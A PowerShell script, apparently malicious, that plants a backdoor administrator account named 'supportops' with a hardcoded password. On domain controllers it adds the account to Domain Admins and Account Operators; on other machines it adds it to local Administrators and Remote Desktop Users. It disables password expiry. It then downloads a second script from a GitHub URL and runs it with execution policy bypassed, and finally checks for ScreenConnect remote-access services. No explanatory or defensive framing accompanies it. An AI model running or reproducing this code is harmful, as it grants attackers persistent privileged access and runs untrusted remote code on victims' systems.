$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$password = "Qz7!Mtn5#R2p"
$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$computer = Get-CimInstance Win32_ComputerSystem
$isDc = $computer.DomainRole -in 4, 5
$net = Join-Path $env:SystemRoot "System32\net.exe"

$user = Get-LocalUser -Name "supportops" -ErrorAction SilentlyContinue
if (-not $user) {
    & $net user supportops $password /add 2>&1 | Out-String | Write-Output
} else {
    & $net user supportops $password 2>&1 | Out-String | Write-Output
}

if ($isDc) {
    & $net user supportops $password /domain 2>&1 |
        Out-String |
        Write-Output
    foreach ($group in @(
        "Domain Admins",
        "Admins. del dominio",
        "Admins du domaine",
        "Domanen-Admins",
        "Domänen-Admins"
    )) {
        & $net group $group supportops /domain /add 2>&1 |
            Out-String |
            Write-Output
    }
    & $net group "Account Operators" supportops /domain /add 2>&1 |
        Out-String |
        Write-Output
} else {
    foreach ($sid in @("S-1-5-32-544", "S-1-5-32-555")) {
        $group = Get-LocalGroup -SID $sid -ErrorAction SilentlyContinue
        if ($group) {
            Add-LocalGroupMember -Group $group -Member "supportops" `
                -ErrorAction SilentlyContinue
        }
    }
}

$account = [ADSI]"WinNT://$env:COMPUTERNAME/supportops,user"
try {
    $flags = [int]$account.UserFlags.Value
    $account.Put("UserFlags", ($flags -band (-bnot 0x40)))
    $account.Put("PasswordExpired", 0)
    $account.SetInfo()
} catch {
    Write-Output "SUPPORTOPS_FLAGS_ERROR=$($_.Exception.Message)"
}

& $net user supportops 2>&1 | Out-String | Write-Output
Write-Output "SUPPORTOPS_PRESENT=yes"

$githubFile = Join-Path $env:TEMP "manual-client-run.ps1"
$githubUrl = "$root/manual-client-run.ps1"
try {
    (New-Object Net.WebClient).DownloadFile($githubUrl, $githubFile)
    Write-Output "GITHUB_FILE_EXEC=manual-client-run.ps1"
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $githubFile
} catch {
    Write-Output "GITHUB_FILE_ERROR=$($_.Exception.Message)"
}

Get-Service |
    Where-Object { $_.DisplayName -like "*ScreenConnect*" } |
    Select-Object Name, DisplayName, Status |
    Format-List
Write-Output "ADMIN_CLIENT_DONE"
